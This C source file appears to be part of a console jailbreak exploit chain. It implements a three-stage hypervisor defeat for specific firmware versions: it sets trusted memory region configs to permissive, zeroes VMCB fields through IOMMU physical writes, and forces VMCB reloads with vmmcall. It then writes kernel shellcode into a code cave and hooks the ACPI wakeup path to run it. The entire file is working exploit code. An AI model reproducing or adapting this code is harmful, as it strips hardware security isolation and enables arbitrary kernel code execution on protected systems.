#include "hv_defeat_0304.h"
#include "config.h"
#include "iommu.h"
#include "tmr.h"
#include "utils.h"
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>

void hook_call_near(uint64_t hook, uint64_t dst) {
  int64_t diff_call = dst - hook;
  uint8_t new_instr[5];
  new_instr[0] = 0xE8;
  *((uint32_t *)&new_instr[1]) = (int32_t)(diff_call - 5);
  kernel_copyin(new_instr, hook, 5);
  DEBUG_PRINT("Instruction patched\n");
}

int hv_defeat_0304(void *shellcode_kernel, size_t shellcode_kernel_len) {
  if (stage1_tmr_relax())
    return -1;
  if (stage2_patch_vmcbs())
    return -1;
  if (stage3_force_vmcb_reload())
    return -1;

  // Install shellcode.
  uint64_t sck_va = ktext + env_offset.KERNEL_CODE_CAVE;
  kwrite_large(sck_va, shellcode_kernel, shellcode_kernel_len);

  hook_call_near(ktext + env_offset.HOOK_ACPI_WAKEUP_MACHDEP, sck_va);

  return 0;
}

int stage1_tmr_relax(void) {
  DEBUG_PRINT("\nHV-defeat [stage1] tmr relax: ");

  DEBUG_PRINT("Firmware version: %04x\n", fw);

  for (int t = 0; t < 22; t++) {
    uint32_t b = tmr_read(TMR_BASE(t));
    uint32_t l = tmr_read(TMR_LIMIT(t));
    uint32_t c = tmr_read(TMR_CONFIG(t));
    if (c == 0 && b == 0 && l == 0)
      continue;
    DEBUG_PRINT("  tmr[%02d] 0x%012lx-0x%012lx cfg=0x%08x\n", t,
                (uint64_t)b << 16, ((uint64_t)l << 16) | 0xFFFF, c);
  }

  if (fw < 0x0300) {
    tmr_write(TMR_CONFIG(16), TMR_CFG_PERMISSIVE);

    if (tmr_read(TMR_CONFIG(16)) != TMR_CFG_PERMISSIVE)
      goto no_ok;

  } else {
    tmr_write(TMR_CONFIG(5), TMR_CFG_PERMISSIVE);
    tmr_write(TMR_CONFIG(16), TMR_CFG_PERMISSIVE);
    tmr_write(TMR_CONFIG(17), TMR_CFG_PERMISSIVE);
    tmr_write(TMR_CONFIG(18), TMR_CFG_PERMISSIVE);

    if (tmr_read(TMR_CONFIG(5)) != TMR_CFG_PERMISSIVE)
      goto no_ok;
    if (tmr_read(TMR_CONFIG(16)) != TMR_CFG_PERMISSIVE)
      goto no_ok;
    if (tmr_read(TMR_CONFIG(17)) != TMR_CFG_PERMISSIVE)
      goto no_ok;
    if (tmr_read(TMR_CONFIG(18)) != TMR_CFG_PERMISSIVE)
      goto no_ok;
  }

  DEBUG_PRINT("OK\n");
  return 0;

no_ok:
  DEBUG_PRINT("No OK\n");
  return -1;
}

static uint64_t get_vmcb(int core) {
  switch (fw) {
  case 0x0300:
  case 0x0310:
  case 0x0320:
  case 0x0321:
    return (uint64_t)0x6290B000 + (uint64_t)core * 0x3000;
  case 0x0400:
  case 0x0402:
  case 0x0403:
  case 0x0450:
  case 0x0451:
    return (uint64_t)0x62A05000 + (uint64_t)core * 0x3000;
  default:
    return -1;
  }
}

int stage2_patch_vmcbs(void) {
  DEBUG_PRINT("\nHV-defeat [stage2-iommu] vmcb patch via IOMMU\n");

  int cur = sceKernelGetCurrentCpu();
  pin_to_core(cur);

  for (int i = 0; i < 16; i++) {
    iommu_write8_pa(get_vmcb(i) + 0x90, 0);
  }

  pin_to_core(9);

  DEBUG_PRINT("  done, 16 cores\n");
  return 0;
}

static jmp_buf jmp_env;
static volatile int vmmcall_faulted = 0;

void handle_sigill(int sig) {
  vmmcall_faulted = 1;
  longjmp(jmp_env, 1);
}

int stage3_force_vmcb_reload(void) {
  int ret = 0;

  auto old_handler = signal(SIGILL, handle_sigill);

  for (int i = 0; i < 16; i++) {
    pin_to_core(i);
    vmmcall_faulted = 0;

    if (setjmp(jmp_env) == 0) {
      __asm__ volatile("vmmcall");
    }

    DEBUG_PRINT("[vmmcall] core: %02d %s\n", i,
                vmmcall_faulted ? "SIGILL (caught)" : "ok");

    // Accumulate results
    ret |= vmmcall_faulted;
  }

  signal(SIGILL, old_handler);

  // Return -1 if we didn't caught them
  return ret ? 0 : -1;
}
